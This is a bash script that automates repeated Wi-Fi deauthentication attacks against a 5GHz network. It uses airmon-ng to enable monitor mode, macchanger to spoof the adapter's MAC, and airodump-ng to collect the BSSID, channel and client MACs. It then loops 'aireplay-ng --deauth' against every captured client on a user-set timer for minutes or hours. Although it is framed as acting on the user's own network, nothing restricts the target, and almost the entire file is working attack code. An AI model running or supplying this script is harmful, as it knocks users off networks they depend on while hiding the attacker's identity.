#!/bin/bash
#Creator: David Parra-Sandoval
#created: 10/21/2020
#Last modified: 11/01/2020
clear

if [[ ${UID} -ne 0 ]]; then
exit 1
fi

    enforcer5GHz () {
    for mac in $(cat realattack); do
if [[ $mac = "Station" ]]; then
echo ""
elif [[ $mac = "MAC" ]]; then
echo ""
else
sudo xterm -e aireplay-ng -D --deauth 50 -a $MYBSSID -c $mac $mon0 &
fi
done
    }
echo "This script will deauthenticate all clients in your 5GHz wifi network"
echo "Using a timer that will run for minutes or hours!"
echo
sleep 3
echo "First lets select your wireless adapter to enable monitor mode."
echo "To gather the info about your 5GHz AP/router:"
echo
sleep 3
echo "enp=Ethernet wl=wireless lo=Loopback"
select wifi in $(ls /sys/class/net); do
mon=$wifi
read -p "Use $wifi:? [y/n] "
case $REPLY in
y|Y) break;;
n|N) echo re-select:;;
*) echo "Only y,Y,n,N:re-select:";;
esac
done
sudo airmon-ng start $mon
mon0=$(ip a | grep wl | cut -d ":" -f2)
sudo ip link set $mon0 down
sudo macchanger -A $mon0 
sudo ip link set $mon0 up
clear
echo "Xterm will launch to input your AP/router info"
read -p "PRESS ENTER"
exec xterm -hold -e sudo airodump-ng --band a $mon0 &
clear
PID=$!
until [[ $INFO = [yY]* ]]; do
read -p "Whats your BSSID: " MYBSSID
echo
read -p "Whats your CH: " CH
echo
read -p "Is this correct?: [y/n] " INFO
clear
done
kill $PID
clear
exec xterm -iconic -e sudo airodump-ng --band a -c $CH $mon0 &
sleep .5
kill $!
echo "Next airodump-ng will launch to capture asssociated 5GHz"
echo "clients on your network, to be validated for deauthentication"
echo "Based on the info provided of your AP/router: $MYBSSID channel: $CH "
echo "airodump-ng will close automatically after info is gathered."
read -p "PRESS ENTER"
exec xterm -e airodump-ng  -c $CH --bssid $MYBSSID --output-format csv -w 5ghzstations $mon0 &
PID=$!
echo
until [[ $INFO2 = [yY]* ]]; do
echo "Deauthenticate your wifi network for:"
read -p "[H]ours or [M]inutes?: "
echo
clear
case $REPLY in
h|H) read -p "How many Hours: " HOUR
echo
read -p "How often should enforcer5GHz launch:? [m/h] " MmHh
case $MmHh in
m|M) read -p "How many Minutes: " 
START=$(( $REPLY * 60 )) ;;
h|H) read -p "How many Hours: "
START=$(( 60 * $REPLY * 60 ));;
esac
HOURS=$(( 60 * $HOUR * 60 ))
TIME=$HOURS
echo
echo "Your 5GHz wifi network will disconnect all associated"
echo "clients every $START seconds for $TIME seconds!"
;;

m|M) read -p "How many Minutes: " min
echo
read -p "How often should enforcer5GHz launch:? [m/h] " MmHh
case $MmHh in
m|M) read -p "How many Minutes: " 
START=$(( $REPLY * 60 )) ;;
h|H) read -p "How many Hours: "
START=$(( 60 * $REPLY * 60 ));;
esac
MINUTES=$(( 60 * $min ))
TIME=$MINUTES
echo
echo "Your 5GHz wifi network will disconnect all associated"
echo "clients every $START seconds for $TIME seconds!"
;;

*) echo "Not valid use m,M,h,H"
;;
esac
echo
read -p "Is this correct?: [y/n] " INFO2
done
kill $PID
MACS=$(wc -l 5ghzstations-01.csv | cut -d " " -f1)
MACSactual=$(($MACS - 4 ))
REALSTATIONS=$(cat 5ghzstations-01.csv | awk -F "," '{print $1}'| tail -$MACSactual)
cat 5ghzstations-01.csv | awk -F "," '{print $1}'| tail -$MACSactual > realattack
sed -i "s/time/$TIME/" timer.sh
sleep 1
clear
sudo xterm -geometry 60x2 -e ./timer.sh &
sleep .5
while true; do
for mac in $(cat realattack); do
if [[ $mac = "Station" ]]; then
sed -i "s/$TIME/$TIME/" timer.sh 
elif [[ $mac = "MAC" ]]; then
sed -i "s/$TIME/$TIME/" timer.sh 
elif [[ $mac = "" ]]; then
echo ""
else
enforcer5GHz
echo -e "enforcer5GHz function will execute every $START seconds!" 
echo -e "This attack on your 5GHz network will prolong for $TIME seconds!"
sed -i "s/$TIME/time/" timer.sh 
sleep $START
clear
fi
done
done
